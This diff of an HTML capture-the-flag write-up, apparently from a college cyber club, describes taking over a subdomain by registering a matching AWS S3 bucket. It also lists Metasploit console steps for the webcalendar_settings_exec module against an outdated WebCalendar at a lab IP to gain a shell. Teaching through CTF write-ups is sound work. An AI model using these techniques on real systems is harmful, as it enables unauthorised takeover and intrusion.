@@ -47,7 +47,7 @@ description: "Mason CC"
 <br /><br />
 <div class="row" style="padding-top: 5%">
   <div class="span6">
-    <b><ul>Subdomain Takeover</ul></b><br />
+    <b>Subdomain Takeover</b><br />
     Without further ado, let's get into our nest egg problem, the "Sudomain Hijack" problem. You had to take over test.hackedctf.com, which is exhibited by hosting content at that domain. It was a relatively simple one, largely predicated on knowledge of AWS S3, a storage service run by Amazon Web Services. It's largely known as a storage service, but it also works as a static website hosting service. As a result of this, you can point your domain to it and ccreate a bucket (effectively a top level folder, if you aren't familiar with AWS) by the name of that domain in AWS, hosting your content there.
     <br /><br />
     Figure 1 displays approximately what you'd expect to see when you visited test.hackedctf.com in your browser. This made it easy. Creating a bucket by the name of test.hackedctf.com showed approximately what you see in Figure 2. Once you upload a file, in our case "tips.html", set it to the homepage, set the bucket to be a public static web hosting bucket, and the file (in AWS referred to as an <i>object</i>), you have enough to prove control.
@@ -62,4 +62,53 @@ description: "Mason CC"
   <i>Fig 2. Simulated Example of Access Denied in AWS S3, what you'd see if the bucket is parked but content isn't being served</i>
   </div>
 <br/>
+</div>
+<div class="row" style="padding-top: 5%">
+  <div class="span6">
+    <b>Web User</b>
+    <br />
+    <p>Web User involved an outdated version of WebCalendar. The version is clearly displayed in various parts of the site, and it is thoroughly out of date. It's exploitable to get a simple shell via msfconsole, with the output below.</p>
+    <code>
+        msf > use linux/http/webcalendar_settings_exec
+        msf exploit(webcalendar_settings_exec) > show options
+
+        msf exploit(webcalendar_settings_exec) > set RHOST 10.109.100.107
+        RHOST => 10.109.100.107
+        msf exploit(webcalendar_settings_exec) > set TARGETURI /
+        TARGETURI => /
+        msf exploit(webcalendar_settings_exec) > show options
+
+        Module options (exploit/linux/http/webcalendar_settings_exec):
+
+           Name       Current Setting  Required  Description
+           ----       ---------------  --------  -----------
+           Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+           RHOST      10.109.100.107   yes       The target address
+           RPORT      80               yes       The target port (TCP)
+           SSL        false            no        Negotiate SSL/TLS for outgoing connections
+           TARGETURI  /                yes       The URI path to webcalendar
+           VHOST                       no        HTTP server virtual host
+
+        Exploit target:
+
+           Id  Name
+           --  ----
+           0   WebCalendar 1.2.4 on Linux
+
+    </code>
+  </div>
+  <div class="span6">
+    <img src="/images/webcal.jpg" />
+    <i>Example of what WebCalendar looked like. It like an old PHP app.</i>
+  </div>
+</div>
+<div class="row" style="padding-top: 5%">
+  <div class="span6">
+    <b>Web Admin</b>
+    <br />
+    Web Admin was compounded on the prior problem involving the shell we got in Web User.
+  </div>
+  <div class="span6">
+    <b>Git User 2</b>
+  </div>
 </div>
